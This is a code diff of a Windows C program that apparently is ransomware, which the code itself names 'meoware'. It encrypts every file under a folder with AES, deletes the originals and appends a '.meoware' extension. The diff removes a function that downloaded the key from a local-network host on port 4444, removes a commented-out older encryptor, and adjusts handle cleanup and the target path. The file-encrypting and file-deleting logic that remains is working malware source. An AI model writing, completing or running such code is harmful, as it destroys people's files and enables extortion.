@@ -9,7 +9,6 @@
 #include <stdio.h>
 #include <process.h>
 #include <stdbool.h>
-#include <wininet.h>
 
 #define AES_BLOCK_SIZE 16
 #define IN_CHUNK_SIZE (AES_BLOCK_SIZE * 10)
@@ -33,147 +32,6 @@ struct ThreadData {
   const char* outputFile;
   const BYTE* aesKey;
 };
-
-// download key file from url
-char* getKeyFile() {
-  HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-  HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)"http://192.168.56.1:4444/secretkey.txt", 0, 0, 0, 0);
-  DWORD dwFileSize = 1024;
-  char* buffer = new char[dwFileSize + 1];
-  DWORD dwBytesRead;
-  DWORD dwBytesWritten;
-  HANDLE hFile = CreateFile("secretkey.txt", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-  do {
-    buffer = new char[dwFileSize + 1];
-    ZeroMemory(buffer, sizeof(buffer));
-    InternetReadFile(hHttpFile, (LPVOID)buffer, dwFileSize, &dwBytesRead);
-    WriteFile(hFile, &buffer[0], dwBytesRead, &dwBytesWritten, NULL);
-    delete[] buffer;
-    buffer = NULL;
-  } while (dwBytesRead);
-
-  CloseHandle(hFile);
-  InternetCloseHandle(hHttpFile);
-  InternetCloseHandle(hSession);
-  return buffer;
-}
-
-// void encryptFile(const char* inputFile, const char* outputFile, const BYTE* aesKey) {
-//   HCRYPTPROV hCryptProv = NULL;
-//   HCRYPTKEY hKey = NULL;
-//   HANDLE hInputFile = INVALID_HANDLE_VALUE;
-//   HANDLE hOutputFile = INVALID_HANDLE_VALUE;
-
-
-//   DWORD len = strlen(aesKey);
-//   DWORD key_size = len * sizeof(aesKey[0]);
-
-//   // Open input file for reading
-//   hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-//   if (hInputFile == INVALID_HANDLE_VALUE) {
-//     printf("CreateFileA input: %d", GetLastError());
-//   }
-
-//   // Create output file for writing
-//   hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-//   if (hOutputFile == INVALID_HANDLE_VALUE) {
-//     printf("CreateFileA output: %d", GetLastError());
-//   }
-
-//   // Cryptographic service provider
-//   if (!CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-//     LPVOID errorMsg;
-//     DWORD error = GetLastError();
-//     FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, (LPSTR)&errorMsg, 0, NULL);
-//     printf("CryptAcquireContextA %d: %s\n", error, errorMsg);
-//     LocalFree(errorMsg);
-//   }
-
-//   HCRYPTHASH hHash;
-//   if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
-//     LPVOID errorMsg;
-//     DWORD error = GetLastError();
-//     FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, (LPSTR)&errorMsg, 0, NULL);
-//     printf("CryptCreateHash %d: %s\n", error, errorMsg);
-//     LocalFree(errorMsg);
-//   }
-
-//   BYTE utf8ByteArray[32];
-//   strcpy(utf8ByteArray, aesKey);
-
-//   if (!CryptHashData(hHash, utf8ByteArray, key_size, 0)) {
-//     LPVOID errorMsg;
-//     DWORD error = GetLastError();
-//     FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, (LPSTR)&errorMsg, 0, NULL);
-//     printf("CryptHashData %d: %s\n", error, errorMsg);
-//     LocalFree(errorMsg);
-//     return 0;
-//   }
-
-//   // HCRYPTKEY hKey;
-//   if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
-//     LPVOID errorMsg;
-//     DWORD error = GetLastError();
-//     FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, (LPSTR)&errorMsg, 0, NULL);
-//     printf("CryptDeriveKey %d: %s\n", error, errorMsg);
-//     LocalFree(errorMsg);
-//     return 0;
-//   }
-
-//   const size_t chunk_size = OUT_CHUNK_SIZE;
-//   BYTE* chunk = (BYTE*)malloc(chunk_size);
-//   DWORD out_len = 0;
-
-//   BOOL isFinal = FALSE;
-//   DWORD readTotalSize = 0;
-//   BOOL bResult = FALSE;
-
-//   DWORD inputSize = GetFileSize(hInputFile, NULL);
-
-//   while (bResult = ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
-//     if (0 == out_len) {
-//       break;
-//     }
-//     readTotalSize += out_len;
-//     if (readTotalSize >= inputSize) {
-//       isFinal = TRUE;
-//     }
-
-//     if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
-//       LPVOID errorMsg;
-//       DWORD error = GetLastError();
-//       FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, (LPSTR)&errorMsg, 0, NULL);
-//       printf("CryptEncrypt %d: %s\n", error, errorMsg);
-//       LocalFree(errorMsg);
-//       break;
-//     }
-//     DWORD written = 0;
-//     if (!WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
-//       LPVOID errorMsg;
-//       DWORD error = GetLastError();
-//       FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, (LPSTR)&errorMsg, 0, NULL);
-//       printf("Writing encrypted file failed %d: %s\n", error, errorMsg);
-//       LocalFree(errorMsg);
-//       break;
-//     }
-//     memset(chunk, 0, chunk_size);
-//   }
-
-//   if (hKey != NULL) {
-//     CryptDestroyKey(hKey);
-//   }
-//   if (hCryptProv != NULL) {
-//     CryptReleaseContext(hCryptProv, 0);
-//   }
-//   if (hInputFile != INVALID_HANDLE_VALUE) {
-//     CloseHandle(hInputFile);
-//   }
-//   if (hOutputFile != INVALID_HANDLE_VALUE) {
-//     CloseHandle(hOutputFile);
-//   }
-
-//   free(chunk);
-// }
 
 void encryptFile(const char* inputFile, const char* outputFile, const char* aesKey) {
   HCRYPTPROV hCryptProv = NULL;
@@ -262,6 +120,13 @@ void encryptFile(const char* inputFile, const char* outputFile, const char* aesK
     memset(chunk, 0, chunk_size);
   }
 
+  if (hInputFile != INVALID_HANDLE_VALUE) {
+    CloseHandle(hInputFile);
+  }
+  if (hOutputFile != INVALID_HANDLE_VALUE) {
+    CloseHandle(hOutputFile);
+  }
+
   // Delete the original file after encryption
   if (!DeleteFileA(inputFile)) {
     printf("error deleting file %s: %d\n", inputFile, GetLastError());
@@ -274,12 +139,6 @@ void encryptFile(const char* inputFile, const char* outputFile, const char* aesK
   }
   if (hCryptProv != NULL) {
     CryptReleaseContext(hCryptProv, 0);
-  }
-  if (hInputFile != INVALID_HANDLE_VALUE) {
-    CloseHandle(hInputFile);
-  }
-  if (hOutputFile != INVALID_HANDLE_VALUE) {
-    CloseHandle(hOutputFile);
   }
 
   free(chunk);
@@ -334,7 +193,7 @@ void encryptFiles(const char* folderPath, const BYTE* key) {
         // Process individual files
         printf("File: %s\n", filePath);
         char encryptedFilePath[MAX_PATH];
-        sprintf_s(encryptedFilePath, MAX_PATH, "%s.aes", filePath);
+        sprintf_s(encryptedFilePath, MAX_PATH, "%s.meoware", filePath);
         struct ThreadData threadData = { filePath, encryptedFilePath, key };
 
         // Start a new thread
@@ -428,7 +287,7 @@ int main() {
     return -1;
   }
 
-  const char* rootFolder = "C:\\Users\\user\\Desktop\\books";
+  const char* rootFolder = "C:\\Users\\user1\\Desktop\\books";
   const char* privateKey = "mymy16ByteKey12";
   encryptFiles(rootFolder, privateKey);
   // char folders[MAX_FOLDERS][MAX_PATH];
